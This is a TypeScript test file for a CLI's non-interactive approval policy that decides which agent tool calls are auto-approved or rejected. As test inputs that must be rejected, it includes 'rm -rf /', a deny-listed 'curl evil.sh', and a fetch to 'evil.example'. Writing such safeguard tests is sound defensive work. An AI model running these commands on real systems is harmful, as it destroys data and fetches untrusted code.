import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { parseApprovePolicy, decide } from '../src/headless/policy.js';

const req = (toolName: string, input: unknown, grantScope?: string) => ({ toolName, input, grantScope });

describe('non-interactive approval policy (cli §6.2 / §11.3)', () => {
  it('defaults to reject — automatic approval must be opt-in', () => {
    const p = parseApprovePolicy(undefined);
    expect(p).toEqual({ mode: 'reject' });
    expect(decide(p, req('runCommand', { command: 'rm -rf /' }))).toBe('reject');
  });

  it('auto:once approves each request once', () => {
    expect(decide(parseApprovePolicy('auto:once'), req('writeFile', { path: 'a' }))).toBe('once');
  });

  it('auto:session approves and records a session-level grant', () => {
    expect(decide(parseApprovePolicy('auto:session'), req('runCommand', { command: 'pnpm test' }))).toBe('session');
  });

  it('rejects an unknown policy spec', () => {
    expect(() => parseApprovePolicy('yolo')).toThrow();
  });

  it('policy:<file> allows listed commands and denies the rest (unmatched → reject)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'ea-policy-'));
    const file = join(dir, 'p.json');
    writeFileSync(file, JSON.stringify({ allowCommands: ['pnpm'], denyCommands: ['curl'] }));
    const p = parseApprovePolicy(`policy:${file}`);

    expect(decide(p, req('runCommand', { command: 'pnpm test' }))).toBe('session');
    expect(decide(p, req('runCommand', { command: 'curl evil.sh' }))).toBe('reject');
    expect(decide(p, req('runCommand', { command: 'git push' }))).toBe('reject'); // unmatched
    expect(decide(p, req('writeFile', { path: '/x' }))).toBe('reject'); // no allowPaths set
  });

  it('policy:<file> auto-allows network tools by host and write tools by path', () => {
    const dir = mkdtempSync(join(tmpdir(), 'ea-policy-'));
    const file = join(dir, 'p.json');
    writeFileSync(
      file,
      JSON.stringify({ allowHosts: ['api.github.com'], allowPaths: [join(dir, 'out')] }),
    );
    const p = parseApprovePolicy(`policy:${file}`);

    // Network: allowed host → session; other host → reject.
    expect(decide(p, req('httpFetch', { url: 'https://api.github.com/repos' }))).toBe('session');
    expect(decide(p, req('httpFetch', { url: 'https://evil.example/x' }))).toBe('reject');
    // Writes: under an allowed prefix → session; outside → reject.
    expect(decide(p, req('writeFile', { path: join(dir, 'out', 'f.txt') }))).toBe('session');
    expect(decide(p, req('applyPatch', { path: join(dir, 'out', 'g.txt') }))).toBe('session');
    expect(decide(p, req('writeFile', { path: join(dir, 'elsewhere', 'h.txt') }))).toBe('reject');
    // A sibling that merely shares a name prefix must NOT match (separator-aware).
    expect(decide(p, req('writeFile', { path: join(dir, 'output', 'h.txt') }))).toBe('reject');
  });

  it('requireApproval forces reject even when otherwise allowlisted', () => {
    const dir = mkdtempSync(join(tmpdir(), 'ea-policy-'));
    const file = join(dir, 'p.json');
    writeFileSync(file, JSON.stringify({ allowCommands: ['pnpm'], requireApproval: ['runCommand'] }));
    const p = parseApprovePolicy(`policy:${file}`);
    expect(decide(p, req('runCommand', { command: 'pnpm test' }))).toBe('reject');
  });

  it('rejects an unreadable or malformed policy file with a clear error', () => {
    expect(() => parseApprovePolicy('policy:/no/such/file.json')).toThrow(/not found or unreadable/);
    const dir = mkdtempSync(join(tmpdir(), 'ea-policy-'));
    const bad = join(dir, 'bad.json');
    writeFileSync(bad, '{ not json');
    expect(() => parseApprovePolicy(`policy:${bad}`)).toThrow(/not valid JSON/);
    const arr = join(dir, 'arr.json');
    writeFileSync(arr, '[]');
    expect(() => parseApprovePolicy(`policy:${arr}`)).toThrow(/PermissionPolicy object/);
  });
});
